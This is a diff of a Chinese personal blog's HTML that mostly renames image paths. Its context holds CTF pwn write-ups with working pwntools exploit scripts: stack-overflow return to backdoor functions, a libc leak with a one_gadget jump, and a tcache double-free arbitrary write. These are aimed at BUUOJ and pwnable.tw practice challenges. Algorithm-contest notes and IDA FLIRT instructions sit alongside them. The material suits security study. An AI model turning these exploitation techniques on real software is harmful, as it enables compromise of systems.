 <h3 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29307</span>)</span><br><span class="line">elf = ELF(<span class="string">'./SUCTF_2018_basic_pwn'</span>)</span><br><span class="line"><span class="comment"># io = process("./SUCTF_2018_basic_pwn")</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">door = <span class="number">0x0000401157</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x110</span>+<span class="number">8</span>)+p64(door)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><p>程序流程是：可以泄漏一个地址，然后可以跳到任意一个地址</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506155959849.png" alt="image-20210506155959849"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506155959849.png" alt="image-20210506155959849"></p>
 <p>方法：泄漏puts的got表地址，计算libc地址，然后跳到one_gadget即可。</p>
 <h3 id="完整exp-4"><a href="#完整exp-4" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./oneshot_tjctf_2016")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27763</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Read location?"</span>)</span><br><span class="line">p.sendline(str(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">"Value: 0x"</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">16</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># onegadget = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Jump location?"</span>)</span><br><span class="line">p.sendline(str(onegadget[<span class="number">0</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>栈溢出</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161229152.png" alt="image-20210506161229152"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161229152.png" alt="image-20210506161229152"></p>
 <p>有后门函数</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161244074.png" alt="image-20210506161244074"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161244074.png" alt="image-20210506161244074"></p>
 <p>故得exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(get_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161308542.png" alt="image-20210506161308542"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506161308542.png" alt="image-20210506161308542"></p>
 <p>但是环境原因，flag在/home/ctf下面的flag或者flag.txt，所以没有拿到flag</p>
 <h3 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h3><ol>
 <li>泄漏libc地址</li>
@@ -673,7 +673,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/19/10-59-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/19/10-59-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -687,7 +687,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/19/10-59-undefined/" class="post-title-link" itemprop="url">团体程序设计天梯赛-练习集</a>
+            <a href="/2021/03/19/10-59-Shuwen/" class="post-title-link" itemprop="url">团体程序设计天梯赛-练习集</a>
         </h2>
 
         <div class="post-meta">
@@ -729,7 +729,7 @@
       
           <p>链接：<a href="https://pintia.cn/problem-sets/994805046380707840/problems/type/7" target="_blank" rel="noopener">团体程序设计天梯赛-练习集</a></p>
 <h2 id="L1-006-连续因子"><a href="#L1-006-连续因子" class="headerlink" title="L1-006 连续因子"></a>L1-006 连续因子</h2><h3 id="序列最长长度"><a href="#序列最长长度" class="headerlink" title="序列最长长度"></a>序列最长长度</h3><p>因为n的取值范围：</p>
-<p><img src="/2021/03/19/10-59-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319111256733.png" alt="image-20210319111256733"></p>
+<p><img src="/2021/03/19/10-59-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319111256733.png" alt="image-20210319111256733"></p>
 <p>又因为最长序列为2×3×。。。n，也就是n的阶乘。</p>
 <p>计算n的最长序列</p>
 <p>发现13!&gt;n最大值，12!&lt;n的最大值，，，，又因为1不算，，，也就是2×3×…13也就是最长为12位。。。</p>
@@ -787,7 +787,7 @@
 <h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>]&gt;&gt;arr[<span class="number">1</span>]&gt;&gt;arr[<span class="number">2</span>];</span><br><span class="line">    sort(arr,arr+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">1</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="L1-011-A-B"><a href="#L1-011-A-B" class="headerlink" title="L1-011 A-B"></a>L1-011 A-B</h2><blockquote>
 <p><del>本来是用eclipse的replace做的，但是超时了，，，555</del></p>
-<p><img src="/2021/03/19/10-59-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319201138492.png" alt="image-20210319201138492"></p>
+<p><img src="/2021/03/19/10-59-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319201138492.png" alt="image-20210319201138492"></p>
 <p>正确的思路：</p>
 <p>遍历第二个字符串，用长度为256（ascii表长度）的数组记录又那些出现过的字符，最后再对第一个字符串遍历，根据数组是否出现过，，，。这里数组的存储的index就是字符串的ascii码【这点比较interesting】</p>
 </blockquote>
@@ -817,7 +817,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/12/12-53-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/12/12-53-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -831,7 +831,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/12/12-53-undefined/" class="post-title-link" itemprop="url">ida flair</a>
+            <a href="/2021/03/12/12-53-Shuwen/" class="post-title-link" itemprop="url">ida flair</a>
         </h2>
 
         <div class="post-meta">
@@ -876,15 +876,15 @@
 <p>以pwnable.tw得3×17题为例</p>
 </blockquote>
 <p>是静态的</p>
-<p><img src="/2021/03/12/12-53-undefined/image-20210312123918829.png" alt="image-20210312123918829"></p>
+<p><img src="/2021/03/12/12-53-Shuwen/image-20210312123918829.png" alt="image-20210312123918829"></p>
 <p>也去了符号表，，，</p>
 <p>所以可以用ida flair这个功能</p>
 <h3 id="1-下载sig"><a href="#1-下载sig" class="headerlink" title="1. 下载sig"></a>1. 下载sig</h3><p><a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">sig-database</a></p>
 <h3 id="2-拷贝"><a href="#2-拷贝" class="headerlink" title="2. 拷贝"></a>2. 拷贝</h3><p>下载文件 =&gt;    libc6    =&gt;    16.04    =&gt;    amd64    =&gt;    选中所有的文件    =&gt;    拷贝到ida目录/sig/pc下面</p>
 <h3 id="3-加载"><a href="#3-加载" class="headerlink" title="3.加载"></a>3.加载</h3><p>在打开文件的ida下选择：file    -&gt;    load file    -&gt;    filter signature file    =&gt;    ctrl+f 找到对应的文件即可</p>
-<p><img src="/2021/03/12/12-53-undefined/image-20210312124712543.png" alt="image-20210312124712543"></p>
+<p><img src="/2021/03/12/12-53-Shuwen/image-20210312124712543.png" alt="image-20210312124712543"></p>
 <h3 id="4-查看"><a href="#4-查看" class="headerlink" title="4.查看"></a>4.查看</h3><p>shift + f5即可查看应用的结果，，，可以看到第一个查到了56个函数，，，</p>
-<p><img src="/2021/03/12/12-53-undefined/image-20210312125241686.png" alt="image-20210312125241686"></p>
+<p><img src="/2021/03/12/12-53-Shuwen/image-20210312125241686.png" alt="image-20210312125241686"></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/u013043103/article/details/109389236?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328642.8119.16155163068355197&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control" target="_blank" rel="noopener">使用IDA flair恢复静态编译去符号的库函数名</a></p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote>
 <p>虽然这次效果不怎么样，，，，，该识别的main函数等都没有识别出来，，，但是成功了，，，，多加些可能效果更好，，，</p>
@@ -908,7 +908,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/11/22-01-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/11/22-01-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -922,7 +922,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/11/22-01-undefined/" class="post-title-link" itemprop="url">常用快捷键</a>
+            <a href="/2021/03/11/22-01-Shuwen/" class="post-title-link" itemprop="url">常用快捷键</a>
         </h2>
 
         <div class="post-meta">
@@ -987,7 +987,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/10/21-27-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/10/21-27-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -1001,7 +1001,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/10/21-27-undefined/" class="post-title-link" itemprop="url">leetcode刷题（入门）</a>
+            <a href="/2021/03/10/21-27-Shuwen/" class="post-title-link" itemprop="url">leetcode刷题（入门）</a>
         </h2>
 
         <div class="post-meta">
@@ -1130,7 +1130,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/08/12-22-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/08/12-22-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -1144,7 +1144,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/08/12-22-undefined/" class="post-title-link" itemprop="url">蓝桥杯算法训练</a>
+            <a href="/2021/03/08/12-22-Shuwen/" class="post-title-link" itemprop="url">蓝桥杯算法训练</a>
         </h2>
 
         <div class="post-meta">
@@ -1251,7 +1251,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/08/12-17-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/08/12-17-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -1265,7 +1265,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/08/12-17-undefined/" class="post-title-link" itemprop="url">蓝桥杯真题解析</a>
+            <a href="/2021/03/08/12-17-Shuwen/" class="post-title-link" itemprop="url">蓝桥杯真题解析</a>
         </h2>
 
         <div class="post-meta">
@@ -1311,7 +1311,7 @@
 </blockquote>
 <h2 id="2013-java-A"><a href="#2013-java-A" class="headerlink" title="2013-java-A"></a>2013-java-A</h2><blockquote>
 <p>视频的总结</p>
-<p><img src="/2021/03/08/12-17-undefined/image-20210304145315375.png" alt="image-20210304145315375"></p>
+<p><img src="/2021/03/08/12-17-Shuwen/image-20210304145315375.png" alt="image-20210304145315375"></p>
 </blockquote>
 <h3 id="1-日历"><a href="#1-日历" class="headerlink" title="1 日历"></a>1 日历</h3><blockquote>
 <p>Calendar API的使用</p>
@@ -1320,7 +1320,7 @@
 <h3 id="2-从我做起振兴中华"><a href="#2-从我做起振兴中华" class="headerlink" title="2 从我做起振兴中华"></a>2 从我做起振兴中华</h3><blockquote>
 <p>递归的思路，学习</p>
 </blockquote>
-<p><img src="/2021/03/08/12-17-undefined/image-20210215133419619.png" alt="image-20210215133419619"></p>
+<p><img src="/2021/03/08/12-17-Shuwen/image-20210215133419619.png" alt="image-20210215133419619"></p>
 <p>观察可得，走法要么走右，要么走下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i == <span class="number">4</span> || j == <span class="number">3</span>) <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//走到，成功</span></span><br><span class="line">	<span class="keyword">return</span> f(i+<span class="number">1</span>,j) + f(i,j+<span class="number">1</span>);<span class="comment">//下或右</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="3-BigInteger"><a href="#3-BigInteger" class="headerlink" title="3 BigInteger"></a>3 BigInteger</h3><blockquote>
@@ -1345,7 +1345,7 @@
 <li>根据特殊情况验证</li>
 </ol>
 <h3 id="6-逆波兰序"><a href="#6-逆波兰序" class="headerlink" title="6 逆波兰序"></a>6 逆波兰序</h3><p>没什么说的，，，</p>
-<h3 id="7-断号和连号"><a href="#7-断号和连号" class="headerlink" title="7 断号和连号"></a>7 断号和连号</h3><h4 id="每行数据长度不等的输入"><a href="#每行数据长度不等的输入" class="headerlink" title="每行数据长度不等的输入"></a>每行数据长度不等的输入</h4><p><img src="/2021/03/08/12-17-undefined/image-20210218145738807.png" alt="image-20210218145738807"></p>
+<h3 id="7-断号和连号"><a href="#7-断号和连号" class="headerlink" title="7 断号和连号"></a>7 断号和连号</h3><h4 id="每行数据长度不等的输入"><a href="#每行数据长度不等的输入" class="headerlink" title="每行数据长度不等的输入"></a>每行数据长度不等的输入</h4><p><img src="/2021/03/08/12-17-Shuwen/image-20210218145738807.png" alt="image-20210218145738807"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">int</span> N = scan.nextInt();</span><br><span class="line">scan.nextLine();<span class="comment">//去掉'\n'</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">String line = scan.nextLine();</span><br><span class="line">String [] split = line.split(<span class="string">" "</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; split.length; j++) &#123;</span><br><span class="line">		list.add(Integer.parseInt(split[j]));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="8-全排列"><a href="#8-全排列" class="headerlink" title="8 全排列"></a>8 全排列</h3><blockquote>
 <p>全排列</p>
@@ -1380,7 +1380,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = n%<span class="number">3</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>注意：static方法必须在static类里面</p>
 <h4 id="5-堆排序"><a href="#5-堆排序" class="headerlink" title="5 堆排序"></a>5 堆排序</h4><p>emmm，填空题不能单靠简单的上下文，，，，保险起见，要学会自己构造例子看结果。</p>
-<h3 id="6-全排列"><a href="#6-全排列" class="headerlink" title="6 全排列"></a>6 全排列</h3><p><img src="/2021/03/08/12-17-undefined/image-20210304185430180.png" alt="image-20210304185430180"></p>
+<h3 id="6-全排列"><a href="#6-全排列" class="headerlink" title="6 全排列"></a>6 全排列</h3><p><img src="/2021/03/08/12-17-Shuwen/image-20210304185430180.png" alt="image-20210304185430180"></p>
 <p>给每个边和顶点编号。</p>
 <p>全排列+然后计算每个编的值</p>
 <h4 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(k==arr.length) &#123;</span><br><span class="line">		check();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//已经确定k-1个了，所以从k开始</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;arr.length;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> t = arr[i];</span><br><span class="line">		arr[i] = arr[k];</span><br><span class="line">		arr[k] = t;</span><br><span class="line">		</span><br><span class="line">		f(k+<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">		t = arr[i];</span><br><span class="line">		arr[i] = arr[k];</span><br><span class="line">		arr[k] = t;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1405,7 +1405,7 @@
 <li>mod运算不能交换</li>
 <li>斐波那契数列 比赛中 用迭代形式来做，不要用递归来做</li>
 </ol>
-<h4 id="迭代形式"><a href="#迭代形式" class="headerlink" title="迭代形式"></a>迭代形式</h4><p><img src="/2021/03/08/12-17-undefined/image-20210304212011899.png" alt="image-20210304212011899"></p>
+<h4 id="迭代形式"><a href="#迭代形式" class="headerlink" title="迭代形式"></a>迭代形式</h4><p><img src="/2021/03/08/12-17-Shuwen/image-20210304212011899.png" alt="image-20210304212011899"></p>
 <h4 id="余数的性质"><a href="#余数的性质" class="headerlink" title="余数的性质"></a>余数的性质</h4><p><code>(A+B)%mod = (A%mod + B%mod)%mod</code></p>
 <p><code>(A*B)%mod = (A%mod * B%mod)%mod</code></p>
 <h2 id="2015-java-A"><a href="#2015-java-A" class="headerlink" title="2015-java-A"></a>2015-java-A</h2><blockquote>
@@ -1449,7 +1449,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/25/18-40-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/25/18-40-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -1463,7 +1463,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/02/25/18-40-undefined/" class="post-title-link" itemprop="url">pwnable.tw(9-16题)</a>
+            <a href="/2021/02/25/18-40-Shuwen/" class="post-title-link" itemprop="url">pwnable.tw(9-16题)</a>
         </h2>
 
         <div class="post-meta">
@@ -1527,7 +1527,7 @@
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br></pre></td></tr></table></figure>
 <p>利用任意地址写成功修改name</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">"./tcache_tear"</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.27/lib/libc-2.27.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/usr/local/glibc-2.27/lib/libc-2.27.so'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sla	= <span class="keyword">lambda</span> delim,data		: p.sendlineafter(delim,data)</span><br><span class="line">cmd	= <span class="keyword">lambda</span> choice			: sla(<span class="string">"Your choice :"</span>,str(choice))</span><br><span class="line">init	= <span class="keyword">lambda</span> name			: sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc	= <span class="keyword">lambda</span> size,data		: (cmd(<span class="number">1</span>),sla(<span class="string">"Size:"</span>,str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free	= <span class="keyword">lambda</span> 			: cmd(<span class="number">2</span>)</span><br><span class="line">info	= <span class="keyword">lambda</span>			: cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br><span class="line"></span><br><span class="line">init(<span class="string">"winter"</span>)</span><br><span class="line">info()</span><br><span class="line">name_bss = <span class="number">0x602060</span></span><br><span class="line">aaw(<span class="number">0x20</span>,name_bss,<span class="string">"admin"</span>)</span><br><span class="line">info()</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
